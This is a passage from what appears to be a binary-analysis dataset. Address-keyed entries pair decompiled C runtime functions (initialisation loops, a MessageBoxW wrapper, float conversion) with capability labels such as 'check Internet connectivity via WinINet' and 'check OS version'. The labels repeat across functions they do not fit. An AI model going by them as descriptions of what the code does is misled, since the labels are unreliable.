piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.00409275();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.00409275();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x41d5c8);\n                        piVar2 = (*pcVar1)(*0x41d5c4);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x4151d0;\n            while (*(unaff_EBP + -0x1c) < 0x4151dc) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x4151e0;\n        while (*(unaff_EBP + -0x20) < 0x4151e4) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040ca5f(8);\n    }\n    return;\n}\n",
        "token_count": 1033
    },
    "0040a59d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040a59d(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040ca5f(0);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0040a5d9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a5d9(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.00409275();\n    var_14h = 0;\n    if (*0x41c610 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"USER32.DLL\");\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, \"MessageBoxW\"), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x0040a736;\n        *0x41c610 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, \"GetActiveWindow\");\n        *0x41c614 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetLastActivePopup\");\n        *0x41c618 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, \"GetUserObjectInformationW\");\n        *0x41c620 = (*pcVar4)(uVar3);\n        if (*0x41c620 != 0) {\n            uVar3 = (*pcVar6)(iVar1, \"GetProcessWindowStation\");\n            *0x41c61c = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x41c61c == var_18h) || (*0x41c620 == var_18h)) {\ncode_r0x0040a6e5:\n        if ((((*0x41c614 != var_18h) && (pcVar4 = (*pcVar6)(*0x41c614),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x41c618 != var_18h && (pcVar4 = (*pcVar6)(*0x41c618),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x41c61c);\n        pcVar5 = (*pcVar6)(*0x41c620);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0040a6e5;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x41c610);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x0040a736:\n    fcn.00406bb6(unaff_EBX);\n    return;\n}\n",
        "token_count": 938
    },
    "0041057e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041057e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x410629;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00410655;\n        uStack36 = *0x41b0e4 ^ &fcn.0041057e::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0041057e::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00409425();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.0041057e::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 722
    },
    "00411441": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00411441(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040a940(0x41a560, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar4 = fcn.00409425();\n    *(iVar4 + 0x90) = *(iVar4 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.0040a8f4();\n        }\n        iVar4 = *(iVar1 + 8);\n        iVar3 = *(iVar4 + iVar5 * 8);\n        *(unaff_EBP + -0x20) = iVar3;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar4 + 4 + iVar5 * 8) != 0) {\n            *(iVar2 + 8) = iVar3;\n            fcn.00412040(*(*(iVar1 + 8) + 4 + iVar5 * 8), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar3;\n        iVar5 = iVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00411503();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0040a8f4();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.0040a985();\n    return;\n}\n",
        "token_count": 571
    },
    "00411503": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00411503(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409425();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00409425();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "004117ca": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004117ca(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.004107ba(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00409425();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00409425();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00410793(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00411562(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 376
    },
    "004120bd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004120bd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    fcn.0040711d(arg_10h);\n    var_14h = fcn.00413038(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00412596(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00412116:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00412156;\n        }\n        if (iVar1 != 2) {\ncode_r0x00412148:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00412156;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00412148;\n        goto code_r0x00412116;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00412156:\n    fcn.00406bb6(unaff_EBX);\n    return;\n}\n",
        "token_count": 495
    },
    "00412165": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00412165(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    fcn.0040711d(arg_10h);\n    var_14h = fcn.00413038(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00412ae7(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x004121be:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x004121fe;\n        }\n        if (iVar1 != 2) {\ncode_r0x004121f0:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x004121fe;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x004121f0;\n        goto code_r0x004121be;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x004121fe:\n    fcn.00406bb6(unaff_EBX);\n    return;\n}\n",
        "token_count": 498
    },
    "00412596": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.00412596(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = str.5_v_[1];\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = str.5_v_[0] + L'\\xffffffff';\n        iVar14 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x004126da;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x004126e1;\ncode_r0x004126da:\n                        do {\n                            bVar6 = true;\ncode_r0x004126e1:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x004126ef;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x004126ef:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x41bf34 - str.5_v_[0]) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x41bf34 < iVar14) {\n                if (iVar14 < *0x41bf30) {\n                    iVar14 = iVar14 + str.5_v_[3];\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = str.5_v_[3] + *0x41bf30;\n                }\n                goto code_r0x00412a9a;\n            }\n            iVar13 = *0x41bf34 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = str.5_v_[0] + L'\\xffffffff';\n            iVar13 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0041288e;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0041288e:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = str.5_v_[1] + L'\\x01' + (str.5_v_[1] + L'\\x01' >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x00412a9a:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = uVar15;\n    }\n    fcn.00406bb6(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3260
    },
    "00412ae7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.00412ae7(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x41bf54;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x41bf50 + -1;\n        iVar14 = *0x41bf50 + (*0x41bf50 >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x41bf50 & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x00412c2b;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x00412c32;\ncode_r0x00412c2b:\n                        do {\n                            bVar6 = true;\ncode_r0x00412c32:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x00412c40;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x00412c40:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = 